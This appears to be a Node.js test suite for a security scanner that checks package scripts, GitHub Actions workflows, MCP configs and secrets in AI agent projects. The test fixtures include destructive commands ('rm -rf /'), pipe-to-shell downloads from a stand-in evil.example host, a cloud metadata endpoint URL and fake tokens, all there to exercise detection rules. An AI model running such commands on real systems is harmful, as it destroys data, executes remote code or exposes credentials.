import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import path from "node:path";
import { test } from "node:test";
import assert from "node:assert/strict";
import { makeTempDir, repoPath } from "./helpers.js";
import { scanProject } from "../src/scanner.js";
import { classifyDangerousCommand, scanDangerousShell } from "../src/scanners/shell.js";
import { scanGitHubActions } from "../src/scanners/github-actions.js";
import { scanMcpConfig } from "../src/scanners/mcp.js";
import { scanSecretContent } from "../src/scanners/secrets.js";
import { scanPackageJson } from "../src/scanners/package.js";
import { scanPythonProjectFiles } from "../src/scanners/python.js";
import { redact } from "../src/scanners/utils.js";
import { loadConfig, matchesAnyPath } from "../src/config.js";
import { formatSarif, formatText } from "../src/reporters.js";
import { markdownCode, sortFindings, stripControlChars, stripSingleLine } from "../src/utils.js";
import { runDoctor } from "../src/doctor.js";

const execFileAsync = promisify(execFile);
const CLI_PATH = repoPath("bin", "agentready.js");

function runCli(args, options = {}) {
  return execFileAsync(process.execPath, [CLI_PATH, ...args], options).then(
    (result) => ({ code: 0, ...result }),
    (error) => ({ code: error.code, stdout: error.stdout || "", stderr: error.stderr || "" })
  );
}

const ids = (findings) => findings.map((finding) => finding.id).sort();
const ALPHA_NUM = "abcdefghijklmnopqrstuvwxyz0123456789";

// -- 1. package.json & markdownCode crash guards ------------------------------

test("scanPackageJson handles JSON null and non-object roots without crashing", () => {
  for (const body of ["null", "[]", "123", '"hello"']) {
    const findings = scanPackageJson("package.json", "package.json", body);
    assert.deepEqual(ids(findings), ["package.invalid_json"], body);
  }
});

test("scanPackageJson resolves script property keys instead of earlier string values", () => {
  const content = JSON.stringify(
    {
      files: ["scripts"],
      scripts: {
        prebuild: "echo clean",
        clean: "rm -rf /"
      }
    },
    null,
    2
  );
  const findings = scanPackageJson("package.json", "package.json", content);
  const finding = findings.find((item) => item.id === "package.script.recursive_delete");
  const expectedLine = content.split("\n").findIndex((line) => /^\s*"clean"\s*:/.test(line)) + 1;
  assert.equal(finding?.line, expectedLine);
});

test("markdownCode handles 150k backtick runs without call-stack overflow", () => {
  const payload = "`x".repeat(150000);
  const wrapped = markdownCode(payload);
  assert.ok(wrapped.startsWith("`` "));
  assert.ok(wrapped.endsWith("``"));
});

test("stripSingleLine removes Trojan Source BiDi chars and collapses newlines in text reports", () => {
  assert.equal(stripControlChars("safe\u202eevil.sh"), "safeevil.sh");
  assert.equal(stripSingleLine("line1\nFakeHeader: injected"), "line1 FakeHeader: injected");

  const report = formatText({
    root: "/project",
    scannedAt: "2026-01-01T00:00:00.000Z",
    filesScanned: 1,
    summary: { high: 0, medium: 1, low: 0, info: 0 },
    config: {},
    findings: [
      {
        id: "script.dangerous_command.sudo",
        severity: "medium",
        category: "shell\nFAKE",
        title: "Title\nSummary: high=0",
        file: "bad\nfile\u202e.sh",
        line: 1,
        evidence: "sudo ls\nNext steps:",
        recommendation: "Review"
      }
    ]
  });
  assert.ok(!report.includes("\u202e"));
  assert.equal(report.split("\n").filter((line) => line.startsWith("Summary:")).length, 1);
});

test("sortFindings handles unknown severities deterministically without NaN", () => {
  const sorted = sortFindings([
    { severity: "custom", file: "b.js", line: 1 },
    { severity: "high", file: "z.js", line: 2 },
    { severity: "info", file: "a.js", line: 1 }
  ]);
  assert.deepEqual(
    sorted.map((item) => item.severity),
    ["high", "info", "custom"]
  );
});

// -- 2. Secret redaction & placeholder hardening ------------------------------

test("single-line escaped and ENCRYPTED private keys are detected and redacted", () => {
  const header = ["-----BEGIN ENCRYPTED", "PRIVATE KEY-----"].join(" ");
  const singleLine = `KEY="${header}\\nMIIEpAIBAAKCAQEA0123456789secretbody"`;
  const findings = scanSecretContent("src/key.js", "key.js", singleLine);
  assert.deepEqual(ids(findings), ["secret.private_key"]);
  assert.doesNotMatch(findings[0].evidence, /MIIEpAIBAAKCAQEA0123456789/);
  assert.match(redact(singleLine), /\[redacted\]/);
});

test("Slack app token ignores short lookalikes and redacts valid tokens", () => {
  assert.deepEqual(scanSecretContent("src/app.js", "app.js", 'const env = "xapp-1-dev-2-prod";'), []);
  const token = ["xapp", "1", "A012345", "1234567890", "abcdef123456"].join("-");
  const findings = scanSecretContent("src/app.js", "app.js", `const t = "${token}";`);
  assert.deepEqual(ids(findings), ["secret.slack_app_token"]);
  assert.doesNotMatch(findings[0].evidence, /abcdef123456/);
});

test("GitHub Actions workflow-level findings and Python requirements redact embedded tokens", () => {
  const fakeGh = ["ghp", ALPHA_NUM].join("_");
  const wf = scanGitHubActions(
    ".github/workflows/ci.yml",
    [
      "on:",
      "  issue_comment:",
      "permissions:",
      "  id-token: write",
      "jobs:",
      "  deploy:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - uses: actions/download-artifact@v5",
      `      - run: bash deploy.sh && aws sts get-caller-identity --token ${fakeGh}`
    ].join("\n")
  );
  for (const id of [
    "github_actions.comment_trigger_run",
    "github_actions.artifact_execution",
    "github_actions.oidc_cloud_deploy"
  ]) {
    const match = wf.find((finding) => finding.id === id);
    assert.ok(match, `expected ${id}`);
    assert.doesNotMatch(match.evidence, new RegExp(fakeGh));
  }

  const py = scanPythonProjectFiles("requirements.txt", "requirements.txt", `flask== # ${fakeGh}\n`.replace("==", ""));
  assert.equal(py.length, 1);
  assert.doesNotMatch(py[0].evidence, new RegExp(fakeGh));
});

test("anchored environment references catch $secret and ${VAR:-secret} while allowing ${input:id}", () => {
  const envFindings = scanSecretContent(
    ".env",
    ".env",
    [
      "API_PASSWORD=$uperSecretPassword123!",
      "API_TOKEN=${API_TOKEN:-real_fallback_secret_123}",
      "STRIPE_SECRET=test_live_998877665544",
      "SAFE_EMPTY=${API_TOKEN:-}",
      "SAFE_VAR=${API_TOKEN}"
    ].join("\n")
  );
  assert.equal(envFindings.filter((item) => item.id === "secret.generic_assignment").length, 3);

  const mcp = scanMcpConfig(
    ".vscode/mcp.json",
    "mcp.json",
    JSON.stringify({
      servers: {
        s1: { command: "node", env: { API_TOKEN: "${input:github-token}", OTHER_SECRET: "$uperSecretPassword123!" } }
      }
    })
  );
  const inline = mcp.filter((item) => item.id === "mcp.inline_secret");
  assert.equal(inline.length, 1);
  assert.match(inline[0].evidence, /OTHER_SECRET/);
});

test("multi-key single-line JSON in sensitive directories reports all secret keys", () => {
  const line = JSON.stringify({
    env: "prod",
    API_TOKEN: "changeme",
    DB_PASSWORD: "real-db-password-value",
    SERVICE_SECRET: "real-service-secret-value"
  });
  const findings = scanSecretContent("secrets/prod.json", "prod.json", line);
  const generic = findings.filter((item) => item.id === "secret.generic_assignment");
  assert.equal(generic.length, 2);
});

// -- 3. .vscode/mcp.json, JSONC, oversized sensitive files, OpenSSH keys ------

test("scanProject scans .vscode/mcp.json with JSONC comments, ignores $schema URLs, and reports all servers", async () => {
  const root = await makeTempDir("agentready-vscode-mcp-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");
  await mkdir(path.join(root, ".vscode"), { recursive: true });
  await writeFile(
    path.join(root, ".vscode", "mcp.json"),
    [
      "{",
      '  // VS Code workspace MCP config',
      '  "$schema": "https://json.schemastore.org/mcp.json",',
      '  "servers": {',
      '    "one": { "command": "/bin/sh -c server", "args": ["/"] },',
      '    "two": { "command": "bash", "args": ["~"], "url": "http://[::ffff:169.254.169.254]/latest" },',
      "  },",
      "}"
    ].join("\n"),
    "utf8"
  );

  const result = await scanProject(root);
  const mcpFindings = result.findings.filter((item) => item.file === ".vscode/mcp.json");
  assert.equal(mcpFindings.filter((item) => item.id === "mcp.remote_url").length, 0, "$schema must not flag remote_url");
  assert.equal(mcpFindings.filter((item) => item.id === "mcp.shell_tool").length, 2);
  assert.equal(mcpFindings.filter((item) => item.id === "mcp.broad_filesystem").length, 2);
  assert.equal(mcpFindings.filter((item) => item.id === "mcp.metadata_endpoint").length, 1);
});

test("oversized sensitive files and OpenSSH key files still emit sensitive_filename", async () => {
  const root = await makeTempDir("agentready-oversized-sens-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");
  await writeFile(path.join(root, "bundle.p12"), Buffer.alloc(128, 0x41));
  await writeFile(path.join(root, "id_ed25519"), "placeholder\n", "utf8");
  // UTF-32LE BOM with NUL bytes must be treated as binary, not UTF-16LE text
  await writeFile(path.join(root, "data.txt"), Buffer.from([0xff, 0xfe, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00]));

  const result = await scanProject(root, {
    config: {
      ignorePaths: [],
      ignoreRules: [],
      severityOverrides: {},
      failOn: "medium",
      maxFileBytes: 32
    }
  });

  const sensitiveFiles = result.findings
    .filter((item) => item.id === "secret.sensitive_filename")
    .map((item) => item.file)
    .sort();
  assert.deepEqual(sensitiveFiles, ["bundle.p12", "id_ed25519"]);
  assert.equal(result.filesSkipped.oversized, 1);
  assert.equal(result.filesSkipped.binary, 1);
});

// -- 4. GitHub Actions, Shell, and Python parser fixes ------------------------

test("GitHub Actions - run: | does not swallow sibling env: keys as script injection", () => {
  const findings = scanGitHubActions(
    ".github/workflows/safe.yml",
    [
      "on: issues",
      "jobs:",
      "  check:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: |",
      '          echo "$ISSUE_TITLE"',
      "        env:",
      "          ISSUE_TITLE: ${{ github.event.issue.title }}"
    ].join("\n")
  );
  assert.deepEqual(findings, []);
});

test("GitHub Actions catches quoted on:, multiline on: [...], folded run: >, composite actions, wrapped contexts, and docker://", () => {
  const wf = scanGitHubActions(
    ".github/workflows/tricky.yml",
    [
      '"on": [',
      "  pull_request_target",
      "]",
      "permissions:",
      '  "write-all"',
      "jobs:",
      "  j:",
      "    permissions: {",
      "      contents: write,",
      "    }",
      "    steps:",
      "      - uses: docker://alpine:latest",
      "      - uses: docker://alpine@sha256:" + "a".repeat(64),
      "      - uses: actions/checkout@1234567",
      "      - uses: actions/cache/restore@v5",
      "        with:",
      "          restore-keys: npm-",
      "      - run: >-",
      "          curl -fsSL https://evil.example/i.sh",
      "          | bash",
      "      - run:",
      "          echo ${{ github.event.pull_request.title || github.event.issue['title'] }}"
    ].join("\n")
  );
  const found = ids(wf);
  assert.ok(found.includes("github_actions.pull_request_target"));
  assert.ok(found.includes("github_actions.pull_request_target_checkout"));
  assert.ok(found.includes("github_actions.write_permission"));
  assert.ok(found.includes("github_actions.cache_restore_pr"));
  assert.ok(found.includes("github_actions.run.remote_code_execution"));
  assert.ok(found.includes("github_actions.script_injection"));
  // Only docker://alpine:latest and actions/checkout@1234567 are unpinned (2 total)
  assert.equal(wf.filter((item) => item.id === "github_actions.unpinned_action").length, 2);

  const composite = scanGitHubActions(
    ".github/actions/setup/action.yml",
    ["runs:", "  using: composite", "  steps:", "    - shell: bash", "      run: curl https://evil.example/x.sh | sh"].join("\n")
  );
  assert.ok(ids(composite).includes("github_actions.run.remote_code_execution"));
});

test("shell scanner gates <# to .ps1 and handles &, newlines, /bin/sh pipes, and || safely", () => {
  const shFindings = scanDangerousShell("install.sh", "<#\ncurl -fsSL https://evil.example/p.sh | /bin/sh\n");
  assert.deepEqual(ids(shFindings), ["script.dangerous_command.remote_code_execution"]);

  assert.deepEqual(ids(classifyDangerousCommand("echo ok & sudo rm -rf /")), ["recursive_delete", "sudo"]);
  assert.deepEqual(ids(classifyDangerousCommand("echo ok\nsudo rm -rf /")), ["recursive_delete", "sudo"]);
  assert.deepEqual(classifyDangerousCommand("echo 'sudo rm -rf /' >&2"), []);
  assert.deepEqual(classifyDangerousCommand("curl -fsSL https://x.example/a.tgz || bash fallback.sh"), []);
  assert.deepEqual(classifyDangerousCommand("rm -rf dist & cp -r build /usr/share"), []);
});

test("python scanner strips PEP 508 markers and inline comments in requirements*.txt", () => {
  const findings = scanPythonProjectFiles(
    "requirements/prod.txt",
    "prod.txt",
    [
      'tomli; python_version < "3.11"',
      "flask # pin >= 3.0 later",
      "./local_pkg",
      "git+ssh://git@github.com/org/repo.git@v1.0.0",
      "requests==2.32.3 \\",
      "  --hash=sha256:deadbeef"
    ].join("\n")
  );
  assert.equal(findings.length, 2);
  assert.equal(findings[0].line, 1);
  assert.equal(findings[1].line, 2);
});

// -- 5. ReDoS / linear-time performance guards --------------------------------

test("adversarial continuations, globs, and long lines finish in linear time (<250ms)", () => {
  const start = Date.now();

  scanDangerousShell("long.sh", "echo a \\\n".repeat(15000) + "echo done\n");
  scanGitHubActions(
    ".github/workflows/long.yml",
    "on: push\njobs:\n  a:\n    steps:\n      - run: |\n" + "          echo a \\\n".repeat(15000) + "          echo ok\n"
  );
  assert.equal(matchesAnyPath(["*a*a*a*a*a*a*a*a*b", "**/**/**/**/**/**/z"], "a".repeat(60)), false);
  classifyDangerousCommand("rm -" + "r".repeat(20000));
  classifyDangerousCommand("curl a ".repeat(5000));
  scanSecretContent(".env", ".env", "API_KEY_" + "TOKEN_".repeat(5000) + "X\n");

  const elapsed = Date.now() - start;
  assert.ok(elapsed < 500, `expected <500ms, took ${elapsed}ms`);
});

// -- 6. Baseline 1-to-1 matching & shift stability ----------------------------

test("one baseline entry cannot suppress two identical findings when a new one is added above", async () => {
  const root = await makeTempDir("agentready-baseline-1to1-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");
  const initialLines = [...Array.from({ length: 9 }, (_, idx) => `# comment ${idx}`), "sudo ls", ""];
  await writeFile(path.join(root, "a.sh"), initialLines.join("\n"), "utf8");

  const baselinePath = path.join(root, ".agentready-baseline.json");
  assert.equal((await runCli(["baseline", root, "--output", baselinePath])).code, 0);

  // Replace comment line 2 in-place with a brand-new `sudo ls` while line 10 stays at line 10.
  initialLines[1] = "sudo ls";
  await writeFile(path.join(root, "a.sh"), initialLines.join("\n"), "utf8");

  const scan = await runCli(["scan", root, "--baseline", baselinePath, "--ci", "--format", "json"]);
  assert.equal(scan.code, 1, "new duplicate finding must fail --ci");
  const parsedScan = JSON.parse(scan.stdout);
  assert.equal(parsedScan.baseline.entries, 1);
  assert.equal(parsedScan.baseline.suppressed, 1);
  assert.equal(parsedScan.findings.length, 1);
  assert.equal(parsedScan.findings[0].line, 2);

  const diff = await runCli(["baseline", "diff", root, "--baseline", baselinePath, "--ci", "--format", "json"]);
  assert.equal(diff.code, 1);
  assert.equal(JSON.parse(diff.stdout).summary.new, 1);
});

test("consecutive identical baselined findings shifting lines together stay matched without false diff", async () => {
  const root = await makeTempDir("agentready-baseline-shift2-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");
  await writeFile(path.join(root, "a.sh"), "sudo ls\nsudo ls\n", "utf8");

  const baselinePath = path.join(root, ".agentready-baseline.json");
  await runCli(["baseline", root, "--output", baselinePath]);

  // Shift lines 1,2 -> lines 2,3 so old Entry 2 collides with new Finding 1 on line 2.
  await writeFile(path.join(root, "a.sh"), "# header\nsudo ls\nsudo ls\n", "utf8");

  const diff = await runCli(["baseline", "diff", root, "--baseline", baselinePath, "--ci", "--format", "json"]);
  assert.equal(diff.code, 0, diff.stdout);
  const parsed = JSON.parse(diff.stdout);
  assert.equal(parsed.summary.matched, 2);
  assert.equal(parsed.summary.new, 0);
  assert.equal(parsed.summary.stale, 0);
});

// -- 7. Init, Doctor, Config, CLI, and SARIF hardening ------------------------

test("init --with-ci refuses to write through symlinked .github/workflows parent directory", { skip: process.platform === "win32" }, async () => {
  const root = await makeTempDir("agentready-init-dirlink-");
  const outside = await makeTempDir("agentready-init-outside-");
  await mkdir(path.join(root, ".github"), { recursive: true });
  await symlink(outside, path.join(root, ".github", "workflows"));
  await writeFile(path.join(root, "agentready.config.json"), "{}\n", "utf8");

  const result = await runCli(["init", root, "--with-ci"]);
  assert.equal(result.code, 0);
  assert.match(result.stdout, /Skipped symbolic link \.github\/workflows\/agentready\.yml/);
  assert.match(result.stdout, /Skipped \.agentready\.json \(agentready\.config\.json already exists\)/);
  assert.equal(existsSync(path.join(outside, "agentready.yml")), false);
  assert.equal(existsSync(path.join(root, ".agentready.json")), false);
});

test("doctor honors ignoreRules and severityOverrides on doctor.* checks", async () => {
  const root = await makeTempDir("agentready-doctor-cfg-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");

  const result = await runDoctor(root, {
    config: {
      ignorePaths: [],
      ignoreRules: ["doctor.node"],
      severityOverrides: { "doctor.write": "low" },
      failOn: "medium"
    }
  });
  assert.equal(result.findings.some((item) => item.id === "doctor.node"), false);
  assert.equal(result.findings.find((item) => item.id === "doctor.write")?.severity, "low");
});

test("config validate warns on non-string failOn/$schema and rejects file targets with hint", async () => {
  const root = await makeTempDir("agentready-cfg-val-");
  const cfgPath = path.join(root, ".agentready.json");
  await writeFile(cfgPath, JSON.stringify({ $schema: 123, failOn: false }), "utf8");

  const loaded = await loadConfig(root);
  assert.equal(loaded.warnings.length, 2);

  const fileTarget = await runCli(["config", "validate", cfgPath]);
  assert.equal(fileTarget.code, 2);
  assert.match(fileTarget.stderr, /must be a directory/);
  assert.match(fileTarget.stderr, /--config/);
});

test("CLI handles --, short-flag missing values, list-rules positionals, version --help, and directory errors cleanly", async () => {
  const root = await makeTempDir("agentready-cli-edge-");
  await writeFile(path.join(root, "AGENTS.md"), "# Agents\n", "utf8");
  await writeFile(path.join(root, ".agentignore"), ".env\n", "utf8");

  assert.equal((await runCli(["scan", "--", root])).code, 0);
  assert.match((await runCli(["version", "--help"])).stdout, /Usage:/);
  assert.equal((await runCli(["scan", root, "--config", "-o", "out.json"])).code, 2);
  assert.equal((await runCli(["list-rules", "github-actions"])).code, 2);
  assert.equal((await runCli(["quickstart", path.join(root, "AGENTS.md")])).code, 2);

  const badConfigDir = await runCli(["scan", root, "--config", root]);
  assert.equal(badConfigDir.code, 3);
  assert.doesNotMatch(badConfigDir.stderr, /at loadConfig/);

  const badOutputDir = await runCli(["scan", root, "--output", root]);
  assert.equal(badOutputDir.code, 4);
  assert.doesNotMatch(badOutputDir.stderr, /at writeOutputFile/);
});

test("SARIF includes security-severity, security tag, ruleIndex, and normalized forward-slash URI", () => {
  const sarif = JSON.parse(
    formatSarif({
      root: "/project",
      scannedAt: "2026-01-01T00:00:00.000Z",
      findings: [
        {
          id: "secret.github_token",
          severity: "high",
          title: "GitHub token-like value is present",
          recommendation: "Rotate it.",
          file: ".\\src\\config.js",
          line: 0
        }
      ]
    })
  );
  const run = sarif.runs[0];
  const ruleIndex = run.results[0].ruleIndex;
  assert.equal(typeof ruleIndex, "number");
  const rule = run.tool.driver.rules[ruleIndex];
  assert.equal(rule.id, "secret.github_token");
  assert.equal(rule.properties["security-severity"], "8.0");
  assert.ok(rule.properties.tags.includes("security"));
  assert.equal(run.results[0].locations[0].physicalLocation.artifactLocation.uri, "src/config.js");
  assert.equal(run.results[0].locations[0].physicalLocation.region, undefined);
});
